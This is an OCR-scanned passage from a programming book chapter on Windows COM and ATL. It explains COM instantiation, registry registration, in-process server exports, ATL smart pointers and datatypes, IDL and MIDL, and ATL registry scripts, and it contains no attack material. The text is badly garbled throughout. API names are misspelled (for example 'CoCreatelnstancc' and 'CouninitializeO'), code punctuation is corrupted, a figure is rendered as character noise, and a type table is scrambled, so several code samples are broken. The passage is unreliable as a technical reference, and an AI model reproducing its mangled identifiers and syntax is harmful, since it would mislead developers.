pleted, it must be terminated with a call to CoUninitialize, which takes no arguments. 
After the runtime is loaded, the client can attain an interface to any object registered 
on the system, or on a remote system. Locally, this is done with a call to 
CoCreatelnstancc. Remotely, this is handled through a call to CoCreatelnstanceEx.The 
CoCreatelnstance function is defined as follows: 
STDAPI CoCraataInstance( 
OTCUHD 
rclsid, 
LVUUMUmi 
pUnkOuter, 

542 
Chapter 13 • Writing Security Components 
DWORD 
dwClsContexEi 
REFIID 
riidi 
IitVOlD * ppv 
i: 
The parameters of interest most often are rrhid, HwCisComex!, riiti, and ppv. 
pUnkOittcrk for COM object aggregation and will be ignored. The re hid parameter 
specifies the object to be loaded. The dwClsContext flag dictates where the object is to 
be loaded: in-process or out-of-process. 
The COM runtime references all COM objects by a globally unique identifier, or 
CUID.Two synonyms for CUID are CLSID and IID. As stated previously, the 
CoCreateInstance function takes an argument of REFCLSID in order to identify the 
object to load. Next, it takes a type of [ID to identify the interface that is queried from 
the object, after it is loaded. How these values work in the COM runtime is discussed in 
the upcoming section titled "COM Registration." 
The following is an example of COM initialization, COM instantiation, and COM 
termination: 
void mainU 
{ 
HRESULT h r ; 
IXMLDQMDocwrlent *pDoc = 0; 
II Initialize COM 
CoInitialize(O) ; 
// Initialize an instance of the MS3CML parser, 
// which is identified by the CLSID of 
11 CLSID_DOMDocument 
hr = CoCreatelnstance( 
CLSID_DOMDocumentH 
NULL, 
C LS CTX_INFROC„S ERVER, 
I ID_I XMLDOMDoc ument, 
(PVOIDM&pDoc) ; 
if (SUCCEEDED(hr) t& pDoc ) 
{ 
// Do something with the interface pointer pDoc 
pDoc-?-Release() ; 
} 
// Terminate COM 
CouninitializeO ; 
) 
COM Object Implementation 
A COM object is referenced by a client in basically the same way regardless of how the 
object is implemented. However, an object is implemented ditferently based on the type 
of object it is. For instance, the ( D M runtime supports objects that are in-process (such 
as DLL) or out-of-process (such as an executable). 

Writing Security Components • Chapter 13 
543 
If the implementation model chosen is in-process, then the COM runtime expects 
the COM Object's containing module (DLL) to implement certain functionality, such as 
the implementation and exportation of certain functions. 
If the implementation model chosen is out-of-process, then the COM runtime 
expects other criteria. Rather than exporting functions, it communicates with the object 
via a form of interprocess communication. This is outside the scope of this primer, how-
ever, and will not be discussed. 
The two categories of technology an in-process module must implement are known 
as registration and activation. The registration phase is what instructs the COM runtime 
to load objects as either in-process or out-of-process. 
C O M Registration 
When a software application is installed, typically the installation routine will register all 
COM objects provided by the software application. This process of registration is what 
informs the COM runtime about the existence of a particular COM object. 
If the COM object is an in-process DLL, it can be registered manually using 
RegSvr32 tool. If the COM object is an out-of-process executable, it can typically be 
registered manually by invoking the executable with an argument of /regscrvcr. However, 
what actually goes on during registration is of most importance to the implementation 
of COM objects. 
As stated previously, COM objects are identified by their associated globally unique 
CLSID value. Obviously, the COM runtime must know about this value in order to 
associate any significance to it.That is where registration comes in. 
The primary data store for component registration information is, not surprisingly, 
inside the Windows Registry. The Windows Registry is essentially a common configura-
tion database provided by the operating system. The database is hierarchical and as such 
is structured as a tree.There are several databases, or hives, inside the Registry, known as 
HKEY_LOCAL_MACHINE and HKEY_CLASSES_ROOT, and so on. Data is stored 
in the Registry in the form of name/value pairs. All names are strings; values can be 
stored in the form of strings, DWORD, or binary values. You can explore and modify 
this database by using the RegEdit tool, as shown in Figure 13.1. 
Figure 13.1 Using RegEdit to View the Windows Registry 
Fl« 
Eff 
Vw 
fHJ.it.fi 
Hfb 
:» :_J WJiadOLMfArfrtierfawlmr A ^J 
E f_J Pfl*sCrt.MSw*d«fl4**r»f0r« 
ffl© 
K*XM.tWM<Anfi.rfirrrr^Tr' 
t (J MSlMtt.HSVWrttiCM* 
ft & *W**3.Mf*IW<K*D.] 
fc f_J HS*«.MSv*tfwdt*0*k 
&• <s) HSudQf .M5«4«ttt«bL*. 1 
E © muoLHSvwns 
• _J MSiWCB.HSWES-l 
It. U Ftitttttl* 
;* CjKiucij.ra.i 
5 f_J MMhHW.DKAHt 
: - U " S w ( W i * . i ? i w * f l . i 
_ i 
K fj *5WiH>Ci.HUNtMd* 
ft (iJ WH4UCMSC4A4L1 
& 4 
MWlKW.HSWrtCMJ 
W LJ tttWlWiC'.0««rt*C*4* 
_ j •>.. i 
( | 
, , . J . . T . 
t^J 
•V 
Gv*^^v_zi*&tiji&>rit*<w<[a£to 
h*n= 
. T H - 
&*, 
JjtDdii*) 
« £ „ * £ 
{ C K M A K H K - I 1H1M£ LD-CKW 
<I 
i 

544 
Chapter 13 * Writing Security Components 
COM-related information is stored in the HKEY_CLASSES_ROOT hive in the 
Registry. The structure of this hive, in terms of relevance to registration, is explained in 
the following sections. 
HKEY_CLASSES_ROOT\CLSID 
The HKEY_CLASSES_ROOT\CLSID key in the Registry is the container of all regis-
tered components in the system, indexed by their CLSID value. A fundamental part of 
component registration is that a component must register its CLSID information in 
this key, 
HKEY_CLASSES_ROOT\ 
CLSID\{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx} 
The presence of a CLSID key inside HKEY_CLASSES_ROOT\CLSID indicates the 
registration of a COM object. The default value of the key is the friendly name of the 
component—for instance, Msxml.The key must also have a child key representing the 
potential ways of instantiation, such as lnprocServer32 or LocalServer32. As the names 
imply, the lnprocServer32 key describes how the object is instantiated for in-pro cess 
loading. Likewise, the LocalServer key describes how the object is accessed out-of-process. 
InprocServer32 
The InprocServcr32 key has several child elements that instruct the COM runtime as to 
how the object is to be loaded. The default value of the InprocServcr32 key is the physical 
location of the DLL on the file system. 
The value name of'ThreadingModel" informs COM what type of threading model 
is supported by the COM object. Potential threading models include Apartment, Free, 
and Both. 
Another child of this key is known as ProgID, which, as a default value, contains the 
textual name by which the component can be accessed. 
LocalServer32 
Like the h]proc$erwr32 key, LocatServer32 also instructs the COM runtime on how to 
load objects from a particular server—in this instance, the server is an executable. 
The default value of this key is the file location of the executable that is launched 
when the object is loaded. 
A child of this key is known as ProgID, which as a default value contains the textual 
name by which the component can be accessed. 
COM IN-PROCESS Server Implementation 
Modules that implement the in-process server model in order to expose their objects are 
typically DLLs. As such, the COM standard requires that all in-process modules must 
export four COM-related functions, which are used by the COM runtime.Those func-
tions are DHGetClassObject, DllCan Unload Now, DHRegisterServer, and 
DllUnregisterServer.These functions and their purposes are discussed next, 

Writing Security Components • Chapter 13 
545 
DllGetClassObject 
DllGetClassObject is the most important function that an in-process module will imple-
ment. Use of this function provides the means by which the module's components are 
accessed.The components are not accessed directly through this function, which is 
defined as follows: 
STDfcFI DllGetClassObject f 
RXPCL&ID 
rclsidi 
RXHID r i i d , 
LFVOID * ppv 
) ; 
The rc/jiW parameter specifies the component to instantiate. The riid parameter does 
not identify the component's interface; rather, this parameter identifies the clan factory to 
instantiate, such as IClassFactory or IClassFactory2, and as such, the third parameter 
returns a pointer to the desired class factory. 
The client uses the class factory to instantiate the component via its Createlnstance 
function. However, this is rarely necessary because the COM runtime takes care of all 
this for all standard cases. 
All standard COM objects that are compliant with the COM runtime must imple-
ment the IClassFactory interface (or otherwise, clients must call CoGctClassObjcct 
instead of CoCreate Instance). 
DllCanUnloadNow 
The DllCanUnloadNow function returns an indication of whether or not the DLL is 
presently in use.The word "use" is defined somewhat loosely here; it could mean that it 
is presently in use interactively, or it could mean that objects are presently accessible by 
COM clients. The definition of DllCanUnloadNow is as follows: 
STIAPI DllCanUnloadHow(void); 
If the DLL can unload now, it returns S_OK. Alternatively, it returns S_FALSE. 
DllRegisterServer 
The DllRegisterServer function invokes the module's capability to self-register itself 
with the system. Each COM object provided by the module is registered, as well as 
other information related to the COM object, such as its Type Library (TypeLib). 
In order to access an in-process module, it must first be registered. To ask a module 
to self-register requires calling the exported function DllRegisterServer. Unfortunately, 
an installer is not available for all situations and therefore it is often necessary to register 
in-process modules directly. Use of the RegSvr32 command-line utility can help. 
Use of this tool consists of passing an argument to the COM module via the com-
mand-line parameter—for instance, RegSvr32 Mydll.dll. 
DllUnregisterServer 
The DllUnregisterServer function does the opposite of DllRegisterServer. 

546 
Chapter 13 * Writing Security Components 
The RegSvr32 utility can also aid in unregistering in-process modules by passing a 
/u flag to the tool. An example of using this is shown next: 
RegSvr32 Mydll.dll /u 
ATL 
Now that you have an understanding of what COM is all about, you probably have 
noticed that there is a significant amount of work involved in making all the pieces of 
COM work together. This is where ATL (Active Template Library) fits into the picture. 
ATL is Microsoft's smallest and fastest library for creating COM servers in C++. Most 
importantly, ATL will dramatically reduce the amount of work involved in COM server 
and client implementation. 
In developing COM client applications, there are several code constructs COM 
requires that could be eliminated by means of code reuse—such as making access to 
lUnknown's methods easier. ATL supports this by using what is called a smart pointer, 
which will be discussed later. 
In developing COM server applications, there are numerous aspects of COM that 
can be implemented by a support library, such as: 
• 
Implementing the IUnknown interface by supporting reference counting and 
interface queries 
• 
Implementing the IClassFactory for all applicable classes 
• 
Handling COM registration/cm registration 
• 
Implementing the entry points of DllGctClassObjcct, DllRegisterServer, 
DllUnregisterServer, and DllCanUnloadNow, if the COM server is an in-pro-
cess DLL 
• 
Registering the COM server's classes with the COM runtime if the COM 
server is an out-of-proc EXE server 
C++ Templates 
As its name suggests, ATL is template-based, just like the Standard Template Library 
(STL). Template programming is a way of enabling code reuse. Instead of inheriting a 
class where you get a bulk of other functionality regardless of whether it is needed or 
not, templates allow you to define what the class actually does. 
To use an example, consider a stack class. Without templates, you really don't have 
an option as to how to store arbitrary data; the stack needs to be a non-reusable special 
stack class that handles a particular datatype or stores fixed-size datablobs or pointers to 
arbitrary data. 
Instead, with templates, you specialize the class when it is defined to work with a 
specific type of data. For example, consider the following definition: 
Stack<int> mylntegerStack; 
myIntegerStack.push(10}; 
my!ntegerStack.push(5); 

Writing Security Components • Chapter 13 
547 
In this definition, the argument to the Stack class template is specified between the 
< and > characters. The Stack class is defined as follows: 
template-sclass T> 
class Stack 
( 
// ... code omitted 
T *m_pStack; // template storage variable 
}; 
Therefore, the template argument parameter known as Tis defined as int when the 
Stack class is compiled—and defined as any other datatype for any other specialized defi-
nitions. 
The benefit of this model is obvious; this template class can be used to implement a 
specialized stack under any circumstance. The same principal is used extensively in ATL. 
ATL Client Technologies 
ATL supports several template classes that help eliminate much of the redundant code 
required of COM client applications. Most of this redundant code is the product of the 
COM's IUnknown and IDispatch interfaces, and its native datatypes of VARIANT and 
BSTR. 
Smart Pointers 
As you know, IUnknown is COM's principal interface for accessing other interfaces an 
object provides and counting the references to those interfaces. ATL provides two classes 
that make management of IUnknown easier: CComPtr and CComQIPtr. 
Both of these classes are known as smart pointers. This is because they provide intelli-
gent access to the pointers that they represent. A few key points that these smart pointers 
implement are as follows: 
• 
The definition of CComPtr takes a template parameter of the interface type 
that it will point to—for example, CConir,tr<IDispatch>. 
• 
CComPtr contains two overloaded methods named CoCrcateltistaticc. Both of 
them omit the interface ID parameter, because the CComPtr class is bound to a 
particular interface already. The difference between the two is that one expects 
a CLS1D value that specifies which component to load; the other takes a string 
argument specifying the ProgID of the component's CLSID. 
• 
The equal operator is overloaded to increment the reference count of the 
interface, if it is assigned. 
• 
The CComPtr class decrements the reference count to its interface when the 
variable goes out of scope. 
An example utilization of the CComPtr class is as follows: 
void maint) 
{ 
CComPtr<IXMLDOMDocument? spDoc; 

548 
Chapter 13 • Writing Security Components 
HRESULT hr = spDoc.CoCreatelnstancet 
L-MSXML.DOMDocument-) ; 
if (FAILED(hr)) 
return hr; 
) 
Datatype Support 
Two datatypes that are present in practically all aatomatioth-coznpattblt interfaces are 
BSTR and VARIANT Both have ATL support classes, which are defined next. 
BSTR 
A BSTR, or binary string, is a Unicode string that is preceded by a WORD value that 
specifies the string's length. Because this is a non-standard string construct (in other 
words, it cannot be generated exclusively as a constant string literal), support from the 
COM runtime is necessary. For example, the following code will allocate a BSTR, print 
it to the screen, and free it. 
BSTR bstrValue = SysAllocString(L"Hello, BSTR!"); 
wprintf {L'fcs-. bstrValue}? 
SysFreeString(bstrValue); 
The use of a BSTR string is obviously tedious and error prone. Because of this. ATL 
supports the class CCouiBSTR. CComBS'fR enables the use of BSTR strings with rela-
tive ease.The following class shows how this class can be used to accomplish the pre-
ceding task: 
wprintf<L"Ss", CComBSTRfL"Hello, BSTR!-)); 
VARIANT 
The variant is essentially a structure that contains a union of quite a few datatypes. This 
structure was inherited from the world of Visual Basic, and is now a native datatype for 
automation-compatible interfaces. It is, therefore, used quite often. 
!!YH^IIESS| 
Before a VARIANT can be used, it must first be initialized for the datatype that it 
3 will contain. This is done by setting the VARIANT'S vt variable to a value that represents 
the type of data it contains.The in variable is of type VARTYPE, which is an enumera-
tion for supported datatypes.The following code shows the usage key of this datatype. 
1 /* 
2 
* VARENUM usage key, 
3 
-
4 
5 
6 
7 
8 
9 
10 
11 
12 
* 
* 
• 
* 
* 
» 
i 
•. 
• 
1 [V] - may 
* [T] - may 
* [P] - may 
* 
[S] 
- m a y 
VT_EMPTY 
VT_NULL 
VT_I2 
appear 
appear 
appear 
appear 
i:i 
in 
ir. 
in 
a VARIANT 
a TYPEDESC 
an OLE propel 
a Safe Array 
[Vj 
[P] 
[V] 
[P] 
[VJ [TJ [PJ [SJ 
ty set 
nothing 
SQL style Mull 
2 byte signed int 

Writing Security Components • Chapter 13 
549 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
2S 
29 
30 
31 
32 
33 
34 
35 
36 
37 
38 
39 
40 
41 
42 
43 
44 
45 
46 
47 
48 
49 
50 
51 
52 
53 
54 
55 
56 
57 
58 
4 
• 
-
* 
* 
1 
* 
* 
* 
* 
* 
* 
* 
* 
' 
• 
4 
• 
* 
* 
1 
' 
• 
• 
• 
* 
* 
* 
* 
• 
4 
* 
* 
* 
1 
* 
-
• 
• 
* 
* 
* 
* 
* 
* 
'
.
• 
VT_I4 
VT_R4 
VT_R8 
VT_CY 
VT_DATE 
VT_BSTR 
VT_DISPATCH 
VT_£RROR 
VT_BOOL 
VT_VARIANT 
VT_UNKNOWN 
VT_EECIMAL 
VT RECORD 
V T _ I 1 
V T _ U i l 
VT_UI2 
VT_UI4 
VT_I8 
VT_UI8 
VT TM7-
VT_UINT 
VT_INT_PTR 
VT_UINT_PTR 
VT_VOIE> 
VT_HRESULT 
VT_PTR 
VT_SAFEARRAY 
VT_CARRAY 
VTJJSERDEFINED 
VT_:.?:-TR 
VT_LPWSTR 
VT_FILETIME 
VT_BLOB 
VT_STREAM 
VT_STORAGE 
VT_STREAMED_OBJECT 
VT_STORED_OBJ ECT 
VT_VERSIONE D_STREAM 
VT_BLOB_OBJ EC T 
VT_CF 
VT_CLSID 
VT_VECTOR 
VT_ARRA¥ 
VT_BYREF 
VT_BSTR_BLOB 
[ V ] [ T ] [ P J [ S ] 
[v] m [PI [si 
[V] [T] [P] [S] 
[V] [T] [P] [S] 
[V] [T] [P] [S] 
[V] [T] [P] [S] 
[V][T] 
[S] 
IV][T][P][S] 
IV] IT] [P] [S] 
[V][TJ[PJ[SJ 
[V] [T) 
[S] 
[V][T] 
[S] 
[V] 
[P][S] 
[V] [T] [P] [s] 
[V][T][P][S] 
[V] [T] [P] [S] 
IV][T][P][S] 
[T) [P] 
[T] [PI 
IV] IT] IP] [S] 
IV][T] 
[S] 
[T] 
[T] 
[T] 
[T] 
[T] 
IT: 
:TI 
(T) 
[T] [P] 
[T][P] 
[Pi 
IP] 
!P] 
[P] 
[P] 
IP: 
[i-'i 
[p] 
: ? ] 
[p] 
[p] 
[V] 
IVI 
4 byte signed int 
4 byte real 
3 byte real 
currency 
date 
OLE Automation string 
IDispatch * 
SCODE 
True=-1H False=Q 
VARIANT * 
IUnknown * 
16 byte fixed point 
user defined type 
signed char 
unsigned char 
unsigned short 
unsigned long 
signed 64-bit int 
unsigned 64-bit int 
signed machine int 
unsigned machine int 
signed machine register size width 
unsigned machine register size width 
C style void 
Standard return type 
pointer type 
(use VT_ARRAY in VARIANT} 
C style array 
user defined type 
null terminated string 
wide nuli terminated string 
FILETIME 
Length prefixed bytes 
Name of the stream follows 
Name of the storage follows 
Stream contains an object 
Storage contains an object 
Stream with a GUID version 
Blob contains an object 
Clipboard format 
A Class ID 
simple counted array 
SAFEARRAY* 
void* for local use 
Reserved for system use 
There are a few nuances in the use of this datatype. First, before a VARIANT can 
be used, it must be initialized with the Variantlnit function. When usage of the variant is 
completed, VariantClear must be called with the variant as a parameter. When a value is 
assigned to the VARIANT, the vt member must be set appropriately, A full example of 
this is as follows: 
VARIANT var; 
Variantlnit(&var); 
VT_UI4; 

550 
Chapter 13 * Writing Security Components 
var.ulVal = 1024; 
VariantClear[ivarj; 
ATL provides support for the VARIANT structure, in the form of CCom Variant. 
This class simplifies the usage of the VARIANT structure by overriding the assignment 
operator for common datatype assignments, such as LPWSTR, inr, long, char, and 
CComBSTR.. Additionally, Variantlnit and VariantClear are automatically called by the 
constructor and destructor. 
An example utilization of this support class is as follows: 
CComVariant var; 
var = CComBSTR(L"This is my variant structure containing a BSTR"); 
ATL Server Technologies 
This section will explore the core of ATL support: in-process server implementation, 
out-of-process implementation, class composition, and class registration. 
Class Composition 
Because class composition is done independently of the type of component server it is 
contained in, we will explore this technology first. 
The boilerplate requirements of implementing a COM object consist of imple-
menting a class factory, supporting the I Unknown interface, and providing whatever 
other interfaces are necessary. ATL classes provide support for implementation of these 
requirements, as summarized in Table 13.1 
Table 13.1 Common ATL Composition Classes 
ATL Class 
Use 
CcomObjectRoot 
Derive your component class from this ATL class in 
order to attain lUnknown's required reference 
counting mechanism. 
CcomCoClass 
Derive your component class from this ATL class in 
order to support the automatic creation of a stan-
dard class factory—ICIassFactory. 
CcomObject 
This object implements the lUnknown interface; 
however, unlike the preceding two, you do not 
derive your class from this class. Rather, you spe-
cialize this class, based on its template parameter, 
to derive itself from your component class. 
With this basic understanding, we can now proceed to compose a COM class and 
define it as we go. Our component will implement a security check that determines 
whether or not a hotfix has been installed. 
First, define the primary interface for this component class: 

Writing Security Components • Chapter 13 
551 
interface IHotFixCheck : lUnknown 
{ 
virtual HRESULT 
stdcall IsPatchlnstalledl 
VAHIANT_BOOL *pbismstalled) = 0; 
)i 
The preceding code defines the interface, or abstract base class, from which we will 
derive our component. An abstract base class is nothing but a binary signature that is 
separate from an implementation. As such, it cannot be instantiated directly because 
there is no direct correlation between it and any implementation. 
There are a few other things to note here. The keyword interface actually is a redefi-
nition of the C/C++ keyword struct. This is used because member elements of the struct 
keyword are implicitly marked as public, rather than classes, where they are implicitly 
marked as private. 
Because this is a COM interface, it must of course be derived from lUnknown. 
Additionally, all members functions of a COM interface must support the 
stdcall 
calling convention. 
It is important to note that declaring your interfaces such as this is not standard. 
Rather, COM interfaces are typically defined in a file that is processed by Microsoft's 
MIDL compiler. Afterwards, the output of the MIDL compiler is basically the preceding 
code fragment, which is included in a header file by your application. We will explore 
this functionality after we implement our object. 
Now that we have defined our interface we can compose our component class. We 
will start as follows: 
class CHotFixCheck : 
public IHotFixCheck // inherit our IHotFixCheck interface 
( 
public: 
HRESULT 
stdcall IsPatchInstalled(VARIANT_B0OL *pblslnstalled) 
I 
// TODO: Patch Check; 
return E_NOTIMPL; 
) 
}; 
Now we have our component class defined. However, it is not ready yet for two 
reasons: it doesn't implement lUnknown and it doesn't support a class factory.Therefore, 
we need to add that functionality in order to proceed. 
In order to implement the reference counting functionality required of lUnknown, 
we must derive our class from the ATL class (XlomObjcctRootBx. QCoinObjectRootEx 
requires one template parameter. That parameter specializes the implementation of 
CComObjectRootHx to work with a specified threading model. Possible values to specify 
as a parameter to this template are CComSiiigleTlireadModcl and CCotuMidtiThreadModcl, 
The difference between these thread model classes is that the CCoinSin^leThreadModcl 
assumes that the class will be accessed by a single thread. Conversely, the 
QCoviMuhiThrcadModd assumes that the class will be accessed by multiple threads, and 
therefore, it uses an atomic operation when incrementing and decrementing the object's 
reference count. 

552 
Chapter 13 * Writing Security Components 
Our class will be accessed by only one thread at a time, so insert the following line 
into our class definition: 
public 
CComObjectRootEx<CComSingleThreadMoael> 
Next, we need to add a support for the instantiation of an automatic class factory. 
This is done by deriving your class from the ATL CComCoClass class.The 
CComCoCiass takes as template arguments a reference to your class' definition name and 
the CLSII) value in reference to your COM object. For our purposes, our code will 
look as follows: 
public CComCoClass<CHotFixCheck, &CLSID_HotFixCheck> 
In order to support [Unknown's Qitaylutafoce method, we must have a way of 
describing the interfaces supported by this component class. ATL provides the 
BEGIN_COM_MAP, COM_INTERFACE_ENTRY_XXX, and END_COM_MAP 
macros just for this purpose. For our class, we will insert the following code into our 
class composition: 
BEGlN_COM_MAP(CHoCFixCheck) 
COM_INTERFACE_ENTRY_IID(IID_IHotFixCheck, IHotFixCheck) 
END_COM_MAP () 
The BEGIN_COM_MAP macro takes one argument—the name of the COM 
class. Following this code, you may declare any number of COM interfaces using the 
appropriate macro. Other applicable macros include: 
• 
COM_INTERFACE_ENTRY Basic interface declaration macro.Takes one 
argument: the type name of the interface. 
• 
COM_INTERFACE_ENTRY_IID The same as the preceding macro, 
except it takes two arguments: the 111) of the interface and the interface type 
name, 
• 
COM_INTERFACE_ENTRY_CHAIN This macro allows you to delegate 
the Qtterylntcrface call to a specified base class. 
• 
COM_INTERFACE_ENTRY_BREAK This is an interface debugging 
macro that causes ATL to call DebugBreak when the specified interface 1ID is 
provided. 
Now, the last task required is to implement the IUnknown interface. This task is dif-
ferent from the preceding tasks in that our component class does not derive from any 
one class to implement this feature. Rather, an ATL class known as CComObject derives 
itself, by means of a template argument, from our class in order to implement this func-
tionality. An example of this with our component class is shown next: 
CComObject<CHctFi)tCheck> *pHFCheck; 
The preceding code fragment is an example of coupling the IUnknown interface 
implementation to our COM class.The next step is to instantiate the object, use it, and 
release our reference. 

Writing Security Components * Chapter 13 
553 
CComObj ect<CHotFixCheck>: iCreatelnstancefkpHFCheck:) ; 
// This is Only necessary because Createlnstance 
// doesn't implicitly increment the reference count. 
pHFCheck->AddRef(): 
pHFCheck->IsPatchInstalled(); 
// object is deleted because the reference count is at // zero. 
pHFCheck->Release()j 
Interface Definition Language 
COM technologies built in C++ employ the convenience of describing a COM inter-
face by using an abstract base class. Doing so works just tine for all in-process COM 
object instantiations. However, when you take into consideration different threading 
models (apartment vs. free threading) and COM class load contexts 
(CLSCTX_INPROC_SERVER, CLSCTX_LOCAL_SERVER) you will find that 
describing your interface using C++ is not sufficient. To understand why this is the case, 
we need to examine the anatomy of the process. 
All processes running on 32-bit Windows have their own private and unique address 
space. Therefore, address 0x30000 in process A is different from address 0x30000 in pro-
cess B.To illustrate this, consider Figure 13.2. 
Figure 13.2 Memory Illustration across Address Spaces 
Process A 
Process B 
pMylnlerface = 
0x30000 
I 
pMyln terrace • 
0x30000 
7\ A 
Physical Address 
0x5F5E100 
Physical Address 
4317100 
Because each process' address space is unique and private, we cannot simply call a 
method in an interface provided by the process. The COM solution to this problem is to 
implement an interprocess communication mechanism that allows process A to call a 
function in process B. This interprocess communication mechanism is known as RPC or 
Remote Procedure Call. In order to use this mechanism, however, COM must know 
more information about the methods provided by your COM server.To illustrate why 
COM must know more information, consider the following code: 

554 
Chapter 13 * Writing Security Components 
void DoSomething(DWORD *p) 
( 
// ... 
) 
In essence, the preceding code takes a pointer to a DWORD. However, there are 
numerous things that this could actually mean: p could actually be an array of 
DWORDs, the function might modify the value of p, or the function may read the 
value of p. If, for example, the value of PVOID were used instead, it would be wholly 
ambiguous what the function does. In writing C++ applications, it typically isn't neces-
sary to have concrete bound type information. However, in terms of calling methods in 
a different address space, it is very important. 
Because of the necessity for interface definitions to be strongly typed, COM uses a 
language called Interface Definition Language (IDL) for describing COM interfaces and 
COM objects.Therefore, any COM server project that supports different load contexts 
and different threading models will invariably have an interface definition file for the 
project. 
IDL files use the extension of .IDL and are passed as a parameter to the Microsoft-
provided MIDL compiler. MIDL will take your IDL file and create several other files 
that describe the interfaces provided by your component servers. We will examine the 
output of MIDL after we describe an interface using IDL. 
Take for illustration purposes the following IDL code fragment: 
1 
[object, uuid("S5C5B433-C0S3-435f-9E4A-8C48557ElD4B")] 
2 interface IWarpEngine : IUnknown 
3 { 
4 
HRESULT Engage![in) VAKIANT_B0OL vbEngage); 
5 
}; 
The preceding code fragment is a typical example of describing an interface using 
IDL. Let us examine it line by line. 
The first line describes the attributes of the interface definition shown next and 
states the following information: 
• 
The following interface is for an object 
• 
The IID for the interface is S5C513433-C053-435f-9E4A-8C48557ElD4B 
The second line states that it is describing an interface known as IWarpEngine, As in 
C/C++, you can declare inheritance; you can do the same here, and derive this interface 
from any other interface as well. The following is a typical example of describing an 
automation-compatible interface, by deriving from the interface IDispatch: 
interface IWarpEngine ; IDispatch 
Just like any class definition, you describe its methods inside its declaration scope. 
IDL in this regard is no different. Inside the curly braces you describe the methods and 
properties supported by the interface. 
The usage of the Engage function in the preceding code fragment is quite obvious: 
It returns a type of HRESULT and takes, as input, a type of VARIANT_BOOL. Its use 
is non-ambiguous—which is the point of IDL. 

Writing Security Components • Chapter 13 
555 
If you want to describe a property provided by a component class, you would 
describe it in IDL as: 
[propgetl Speed![out, retval) LONG *pspeed); 
[propput] Speed([in] LONG Speed); 
In order to describe a property, it must be attributed as such, by the presence of the 
IDL propput or propgel attribute, which precedes the name of the property. The propget 
attribute function cannot take any input argument, only one output argument. It 
describes this fact by the attribute preceding its argument declarations: (out, rcti'alj. The 
propput function takes only an input value, which is described by the presence of the 
attribute [mj. When describing your interfaces, use the MSDN as a reference to deter-
mine how you would express something in IDL.The key point to remember is that it 
must be described unambiguously. 
After you have defined your COM interfaces in IDL, you need to define the envi-
ronment in which it will be provided, that is, its library and coclass (or component class). 
You do this with code like the following: 
[uuid(r,DEEClA90-820C-4744-BElD-9E3C357EDEBl"), 
v e r s i o n ( 1 . 0 ) ) 
library SpaceShipLib 
{ 
imporclibl"stdole32.tlb"); 
(uuid("305441D4-9014-4d49-A54F-2DF536E5EC6T'H 
coclass Spaceship 
( 
interface IWarpEngine; 
); 
:
•
; 
Just as with all constructs in IDL, the first line describes the attributes of the fol-
lowing library declaration.The attributes specified for the hbrary include the LIBID and 
its version.The Library section is used to instruct IDL to build a type library or TypeLib. 
This TypeLib is the compiled version of all information referenced in the IDL library 
declaration. This TypeLib is used to instruct the COM runtime about how the compo-
nent server is to be used. 
The body of the library construct is where information such as component class 
declarations go. In this instance, the body declares one component class known as 
Spaceship, and imports a compiled TypeLib known as stdole32.tlb. 
Inside the component class declaration, Spaceship, a reference is made to the inter-
face IWarpDrive.This reference ensures that information for the IWarpDrive interface is 
brought into the TypeLib and also states that the IWarpDrive interface is supported by 
the component class Space-Ship. 
After you have created your IDL file, you need to compile it with MIDL. MIDL 
takes various command-line flags, however, most are unimportant unless you're doing 
something non-standard. When you're ready to compile your IDL file, just pass the file 
name as an argument to MIDL, like this: 
midi.exe Spaceship.IDL 

556 
Chapter 13 * Writing Security Components 
After the compilation succeeds, you will attain several new files in the same direc-
tory. These files are described in Table 13.2. 
Table 13.2 List of Files Generated by MIDL 
File Name 
Purpose 
Spaceship.h 
This file is to be included by your ATL project since 
it contains all the abstract base class definitions, in 
C/C+ + form, which you are to implement in your 
component class. Additionally, it also contains ref-
erences to all the associated CLSID, IID, and LIBID 
values generated by MIDL. If you wish to rename 
this file in MIDL, use the /h flag. 
SpaceshipJ.c 
This file contains all the actual GUID values refer-
enced by the spaceships file. If you wish to 
rename this file in MIDL, use the /iid flag. 
Spaceship.tlb 
This file represents the compiled version of the IDL 
file. In fact, you can generate the IDL file from this 
compiled TypeLib. You may distribute this file inde-
pendently from your module, or include it in its 
resource section. Typically, it is the location in the 
first ordinal of your module's resource section. 
Dlldata.c 
This file contains information such as the entry 
point for the proxy/stub code that is required for 
calling the module's interfaces remotely. 
Spaceshipp.c 
This file contains the implementation of the 
required proxy/stub code for calling the compo-
nent's interface methods inside a remote process, 
such as an EXE server. 
Class Registration 
As you know, all COM objects must be registered before they can be used. For a COM 
object provided by a DLL component server, registration is performed when a client 
calls the DLL's entry point DllRegisterServer, For an EXE server, registration is per-
formed when the client passes the command-line flag /REGSERVER.The process of 
registration is, for the most part, the same for both types of component servers. 
Registration for non-ATL component servers is usually very mundane, consisting of 
numerous repetitive registry calls. In contrast, ATL provides an easy way to set up a 
component's Registry entries by means of a registry script that is associated to each com-
ponent class offered by the server. 
The format the Registry scripts are written in is not a new invention that pertains 
exclusively to ATL. Rather, the scripts are written in a Backus Nauer Form, or BNF, 
which is quite simple to use. 

Writing Security Components • Chapter 13 
557 
As you can probably guess, Registry scripts are processed during COM registration. 
ATL fires up its script engine and performs registrations as specified by the Registry 
script. To better understand Registry scripts, consider the following example: 
HKCR { 
NoRemove CLSID { 
ForceRemove 
(9C129B36-EE42-4669-B2n-4154821F9B4E) 
= 
s 
'MySimpleObject C l a s s h 
{ 
i np roc Server 3 2 - s ^ M O D U L E * 1 { 
val ThreadingModel = s 'Apartment' 
} 
) 
: • 
: • 
As any C/C++ developer can determine at a glance, the syntax is hierarchical.The 
first expected element is known as the root key. The root key pertains to the Registry hive 
that the child elements in the script are associated with. Possible values for the root key 
are: 
• 
HKEY_CLASSES_ROOT (or HKCR) 
• 
HKEY_CURRENT_USER (or HKCU) 
• 
HKEY_LOCAL_MACHINE (or HKLM) 
• 
HKEYJJSERS (or HKU) 
• 
HKEY_PERFORMANCE_DATA (or HKPD) 
• 
HKEY_DYN_DATA (or HKDD) 
• 
HKEY_CURRENT_CONFIG (or HKDD) 
The preceding script uses HKCR or HKEY_CLASSES_ROOT. Everything that 
follows the root key is known as a Registry expression, which consists of adding or 
removing a key from the Registry. All child elements of the root key element in the pre-
vious script arc Registry expressions which instruct the ATL registrar to add keys with 
particular values in the Registry Lets dissect the earlier script line by line. 
NoRemove CLSID { 
This line instructs the ATL registrar to create the key CLSID, if necessary, but to 
never remove it. 
ForceRemove 
